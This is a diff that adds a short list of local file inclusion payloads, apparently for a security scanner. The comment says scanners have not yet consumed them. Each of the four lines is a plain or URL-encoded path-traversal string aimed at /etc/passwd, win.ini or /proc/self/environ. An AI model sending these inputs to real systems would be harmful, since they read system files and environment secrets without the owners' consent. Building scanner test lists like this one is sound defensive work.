@@ -1,0 +1,5 @@
+# Local file inclusion payloads (not yet consumed by scanners)
+../../../../etc/passwd
+..%2f..%2f..%2f..%2fetc/passwd
+../../../../windows/win.ini
+..%2f..%2f..%2f..%2fproc/self/environ
